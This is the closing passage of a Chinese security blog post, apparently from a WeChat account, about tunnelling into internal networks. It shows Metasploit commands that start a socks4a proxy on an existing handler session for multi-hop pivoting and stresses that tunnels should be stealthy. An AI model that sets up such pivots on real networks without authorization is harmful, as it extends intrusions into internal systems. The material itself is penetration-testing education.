![图片](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkojXxXvepRWy8TJb1DwI0WbHXROnP4uNmCvhTqU3Ms89VjXo4G0wA9ydnTzQgicVsYb4qkeaiaUuqMA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

可在metasploit继续渗透，或开启一个socks，挂载其他工具上多层穿透。

<table width="873" style="width: 654px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">1</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">2</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 auxiliary(server/socks4a) &gt; set srvport 10080</pre></td></tr><tr style="box-sizing: border-box;border-width: initial;border-style: none;border-color: initial;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding-top: 15px;padding-bottom: 15px;color: rgb(204, 204, 204);line-height: 1.5;border-width: initial;border-style: none;border-color: initial;text-align: right;">3</pre></td><td style="box-sizing: border-box;padding: 0px;border-width: initial;border-style: none;border-color: initial;" width="866"><pre style="box-sizing: border-box;overflow: auto;font-family: monospace, monospace;background: rgb(250, 250, 250);padding: 15px 10px;line-height: 1.5;border-width: initial;border-style: none;border-color: initial;">msf5 auxiliary(server/socks4a) &gt; run -j</pre></td></tr></tbody></table>

总结
--

内网穿透时，代理需要稳定、隐蔽，思路更需要不断的拓宽。毕竟在实战中，多么复杂的环境都会遇到，更多的是总结不同打法，进行落地，最终将内网的“大门”打开！

往期推荐

[

干货|文件上传绕过思路总结  建议收藏



](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247500087&idx=1&sn=be601aa30ffe7a95425622313207b576&chksm=9acd11a8adba98be7337e48cb1615bc306f3bb98d93d429636ed624dc23acf5456b06fa917fa&scene=21#wechat_redirect)

[

实战 | 一次运气很好的文件上传绕过



](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247500136&idx=1&sn=cc0b1692022fa977a4614d7c8ed53621&chksm=9acd11f7adba98e1e33d457b53320df643fd7b6654a8e417fae5283938c2f8d2d39ffd9a6610&scene=21#wechat_redirect)

[

实战|记一次通过供应链拿到目标后台权限的过程



](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247500171&idx=1&sn=b858a5867beda8f4011791c66d08d8d7&chksm=9acd1114adba9802fabd12b45b80b98a5586776926a2e449689ea95bfcdf43e37fecc40f5a8d&scene=21#wechat_redirect)

[

干货|基于HTTP协议的WAF绕过技巧



](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247500042&idx=1&sn=32aa61e3cfd5348a24caf1aaa11c2b43&chksm=9acd1195adba9883f1477927c3af7da599d822bb292d6734146f3c2fa0285f9418b951016bdc&scene=21#wechat_redirect)

  

**推荐阅读**

[**![图片](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyIDG0WicDG27ztM2s7iaVSWKiaPdxYic8tYjCatQzf9FicdZiar5r7f7OgcbY4jFaTTQ3HibkFZIWEzrsGg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247499690&idx=2&sn=245f5a9ba5092e52cb3e73e021c998b8&chksm=9acd2f35adbaa623c90dbd8fa2c2d29dda00d9f2430677ee977878c0d8350cddef045acefefa&scene=21#wechat_redirect)  

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavx2yyhJibAziblI8R81ZMyNFzQ4wrvUIE2Ks14R3ZfGmjEwNXbCzXm5Qcwkcuxsm8pn2ibIISmRoxPLA/0?wx_fmt=png) ** 乌雲安全 ** 乌雲安全，致力于网络安全攻防、内网渗透、代码审计、安卓逆向、CTF比赛、应急响应、安全运维、安全架构、linux技巧等技术干货分享。 43篇原创内容   公众号

**求师傅们点个赞、在看、分享三连击**